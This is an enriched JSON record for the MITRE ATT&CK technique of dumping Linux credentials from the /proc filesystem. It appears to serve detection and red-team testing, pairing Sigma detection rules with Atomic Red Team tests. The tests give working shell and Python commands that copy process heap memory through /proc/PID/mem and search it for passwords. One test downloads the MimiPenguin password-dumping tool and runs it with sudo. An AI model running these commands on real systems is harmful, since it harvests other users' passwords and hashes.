{
    "id": "T1003.007",
    "name": "Proc Filesystem",
    "description": "Adversaries may gather credentials from information stored in the Proc filesystem or `/proc`. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.\nThis functionality has been implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.",
    "platforms": "Linux",
    "kill_chain_phases": "Credential Access",
    "data_sources": "Command: Command Execution, File: File Access",
    "detection": "To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path `/proc/*/maps`, where the `*` directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.",
    "url": "https://attack.mitre.org/techniques/T1003/007",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1003.007",
                "atomic_attack_guid": "a27418de-bdce-4ebd-b655-38f04842bf0c",
                "atomic_attack_name": "Capture Passwords with MimiPenguin",
                "platform": "Linux",
                "sigma_rules": [
                    {
                        "rule_name": "Execution Of Script Located In Potentially Suspicious Directory",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_susp_shell_script_exec_from_susp_location.yml",
                        "remote_content": "title: Execution Of Script Located In Potentially Suspicious Directory\nid: 30bcce26-51c5-49f2-99c8-7b59e3af36c7\nstatus: test\ndescription: Detects executions of scripts located in potentially suspicious locations such as \"/tmp\" via a shell such as \"bash\", \"sh\", etc.\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\n    - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023-06-02\ntags:\n    - attack.execution\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection_img:\n        Image|endswith:\n            - '/bash'\n            - '/csh'\n            - '/dash'\n            - '/fish'\n            - '/ksh'\n            - '/sh'\n            - '/zsh'\n    selection_flag:\n        CommandLine|contains: ' -c '\n    selection_paths:\n        # Note: Add more suspicious paths\n        CommandLine|contains: '/tmp/'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Linux Sudo OR Su Execution",
                        "rule_link": "https://research.splunk.com/endpoint/4b00f134-6d6a-11ec-a90c-acde48001122/"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "55e29995-75e7-451a-bef0-6225e2f13597",
                    "3120b9fa-23b8-4500-ae73-09494f607b7d"
                ],
                "lookup_results": [
                    {
                        "uuid": "55e29995-75e7-451a-bef0-6225e2f13597",
                        "lookup_data": {
                            "description": "Detects changes to the Registry in which a monitor program gets registered to dump the memory of the lsass.exe process",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/02/26\ndescription: Detects changes to the Registry in which a monitor program gets registered\n  to dump the memory of the lsass.exe process\ndetection:\n  condition: selection\n  selection:\n    TargetObject|contains: Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe\nfalsepositives:\n- Unlikely\nid: 55e29995-75e7-451a-bef0-6225e2f13597\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/12/19\nreferences:\n- https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/\n- https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\nrelated:\n- id: 36803969-5421-41ec-b92f-8500f79c23b0\n  type: similar\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Potential Credential Dumping Via LSASS SilentProcessExit Technique\n",
                            "sigma:id": "55e29995-75e7-451a-bef0-6225e2f13597",
                            "title": "Potential Credential Dumping Via LSASS SilentProcessExit Technique",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3120b9fa-23b8-4500-ae73-09494f607b7d",
                        "lookup_data": {
                            "mitre-attack-id": "T1003.007",
                            "mitre-cti:description": "Adversaries may gather credentials from information stored in the Proc filesystem or <code>/proc</code>. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.\n\nThis functionality has been implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.",
                            "mitre-cti:name": "Proc Filesystem",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d', 'type': 'attack-pattern', 'created': '2020-02-11T18:46:24.434Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1003.007', 'url': 'https://attack.mitre.org/techniques/T1003/007'}, {'url': 'https://github.com/huntergregal/mimipenguin', 'description': 'Gregal, H. (2017, May 12). MimiPenguin. Retrieved December 5, 2017.', 'source_name': 'MimiPenguin GitHub May 2017'}], 'modified': '2020-03-19T15:32:18.098Z', 'name': 'Proc Filesystem', 'description': 'Adversaries may gather credentials from information stored in the Proc filesystem or <code>/proc</code>. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.\\n\\nThis functionality has been implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/\\\\*/maps</code>, where the <code>\\\\*</code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['File: File Access', 'Command: Command Execution'], 'x_mitre_permissions_required': ['root']}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1003.007",
                "display_name": "OS Credential Dumping: Proc Filesystem",
                "atomic_tests": [
                    {
                        "name": "Dump individual process memory with sh (Local)",
                        "auto_generated_guid": "7e91138a-8e74-456d-a007-973d67a0bb80",
                        "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "output_file": {
                                "description": "Path where captured results will be placed",
                                "type": "path",
                                "default": "/tmp/T1003.007.bin"
                            },
                            "script_path": {
                                "description": "Path to script generating the target process",
                                "type": "path",
                                "default": "/tmp/T1003.007.sh"
                            },
                            "pid_term": {
                                "description": "Unique string to use to identify target process",
                                "type": "string",
                                "default": "T1003.007"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "Script to launch target process must exist\n",
                                "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
                                "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
                            }
                        ],
                        "executor": {
                            "name": "sh",
                            "elevation_required": true,
                            "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"\n",
                            "cleanup_command": "rm -f \"#{output_file}\"\n"
                        }
                    },
                    {
                        "name": "Dump individual process memory with sh on FreeBSD (Local)",
                        "auto_generated_guid": "fa37b633-e097-4415-b2b8-c5bf4c86e423",
                        "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "output_file": {
                                "description": "Path where captured results will be placed",
                                "type": "path",
                                "default": "/tmp/T1003.007.bin"
                            },
                            "script_path": {
                                "description": "Path to script generating the target process",
                                "type": "path",
                                "default": "/tmp/T1003.007.sh"
                            },
                            "pid_term": {
                                "description": "Unique string to use to identify target process",
                                "type": "string",
                                "default": "T1003.007"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "Script to launch target process must exist\n",
                                "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
                                "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
                            }
                        ],
                        "executor": {
                            "name": "sh",
                            "elevation_required": true,
                            "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nMEM_START=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f1)\nMEM_STOP=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f2)\nMEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\nstrings \"#{output_file}\" | grep -i PASS\n",
                            "cleanup_command": "rm -f \"#{output_file}\"\n"
                        }
                    },
                    {
                        "name": "Dump individual process memory with Python (Local)",
                        "auto_generated_guid": "437b2003-a20d-4ed8-834c-4964f24eec63",
                        "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "output_file": {
                                "description": "Path where captured results will be placed",
                                "type": "path",
                                "default": "/tmp/T1003.007.bin"
                            },
                            "script_path": {
                                "description": "Path to script generating the target process",
                                "type": "path",
                                "default": "/tmp/T1003.007.sh"
                            },
                            "python_script": {
                                "description": "Path to script generating the target process",
                                "type": "path",
                                "default": "PathToAtomicsFolder/T1003.007/src/dump_heap.py"
                            },
                            "pid_term": {
                                "description": "Unique string to use to identify target process",
                                "type": "string",
                                "default": "T1003.007"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "Script to launch target process must exist\n",
                                "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
                                "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
                            },
                            {
                                "description": "Requires Python\n",
                                "prereq_command": "(which python || which python3 || which python2)\n",
                                "get_prereq_command": "echo \"Python 2.7+ or 3.4+ must be installed\"\n"
                            }
                        ],
                        "executor": {
                            "name": "sh",
                            "elevation_required": true,
                            "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON #{python_script} $PID #{output_file}\ngrep -i \"PASS\" \"#{output_file}\"\n",
                            "cleanup_command": "rm -f \"#{output_file}\"\n"
                        }
                    },
                    {
                        "name": "Capture Passwords with MimiPenguin",
                        "auto_generated_guid": "a27418de-bdce-4ebd-b655-38f04842bf0c",
                        "description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "output_file": {
                                "description": "Path where captured results will be placed",
                                "type": "path",
                                "default": "/tmp/T1003.007Test3.txt"
                            },
                            "MimiPenguin_Location": {
                                "description": "Path of MimiPenguin script",
                                "type": "path",
                                "default": "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
                                "prereq_command": "if [ -f \"#{MimiPenguin_Location}\" ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz\nmkdir /tmp/mimipenguin\ntar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin\n"
                            },
                            {
                                "description": "Strings must be installed\n",
                                "prereq_command": "if [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "sudo apt-get -y install binutils\n"
                            },
                            {
                                "description": "Python2 must be installed\n",
                                "prereq_command": "if [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "sudo apt-get -y install python2       \n"
                            },
                            {
                                "description": "Libc-bin must be installed\n",
                                "prereq_command": "if [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "sudo apt-get -y install libc-bin        \n"
                            }
                        ],
                        "executor": {
                            "command": "sudo #{MimiPenguin_Location} > #{output_file}\ncat #{output_file}\n",
                            "cleanup_command": "rm -f #{output_file} > /dev/null\n",
                            "name": "bash",
                            "elevation_required": true
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 10:43:00"
}